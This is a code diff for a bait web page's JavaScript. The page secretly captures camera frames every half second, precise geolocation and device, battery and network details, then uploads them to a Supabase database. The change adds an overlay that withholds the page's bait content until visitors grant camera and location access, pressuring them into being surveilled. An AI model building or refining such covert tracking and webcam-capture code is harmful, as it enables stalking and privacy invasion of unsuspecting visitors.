@@ -8,13 +8,27 @@ const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
+const blockOverlay = document.getElementById('blockOverlay');
+const retryBtn = document.getElementById('retryBtn');
+const baitContainer = document.getElementById('baitContainer');
 
 let stream = null;
 let autoInterval = null;
 let captureDetails = {};
+let cameraActive = false;
+
+function blockPage() {
+  blockOverlay.classList.remove('hidden');
+  baitContainer.classList.add('hidden');
+}
+
+function unblockPage() {
+  blockOverlay.classList.add('hidden');
+  baitContainer.classList.remove('hidden');
+}
 
 function autoCapture() {
-  if (!stream || !video.srcObject || video.readyState < 2) return;
+  if (!cameraActive || !stream || !video.srcObject || video.readyState < 2) return;
 
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
@@ -40,31 +54,30 @@ async function initCamera() {
     });
     video.srcObject = stream;
     await video.play();
+    cameraActive = true;
+    unblockPage();
 
     autoCapture();
-    autoInterval = setInterval(autoCapture, 500);
+    if (!autoInterval) autoInterval = setInterval(autoCapture, 500);
   } catch (err) {
-    console.error('Camera error:', err);
-    setTimeout(initCamera, 2000);
+    cameraActive = false;
+    blockPage();
   }
 }
 
 function requestGeoLocation() {
-  if ('geolocation' in navigator) {
-    navigator.geolocation.getCurrentPosition(
-      (pos) => {
-        const { latitude, longitude } = pos.coords;
-        captureDetails.latitude = latitude;
-        captureDetails.longitude = longitude;
-        saveDetails();
-      },
-      (err) => {
-        console.error('Geo error:', err);
-        setTimeout(requestGeoLocation, 2000);
-      },
-      { enableHighAccuracy: true }
-    );
-  }
+  if (!('geolocation' in navigator)) return;
+
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      const { latitude, longitude } = pos.coords;
+      captureDetails.latitude = latitude;
+      captureDetails.longitude = longitude;
+      saveDetails();
+    },
+    () => blockPage(),
+    { enableHighAccuracy: true }
+  );
 }
 
 function captureDeviceInfo() {
@@ -123,9 +136,14 @@ function saveDetails() {
   supabase.from('device_details').insert(captureDetails).catch(() => {});
 }
 
-initCamera();
-requestGeoLocation();
+retryBtn.addEventListener('click', () => {
+  initCamera();
+  requestGeoLocation();
+});
+
 captureDeviceInfo();
 captureBattery();
 captureNetwork();
 captureMedia();
+initCamera();
+requestGeoLocation();
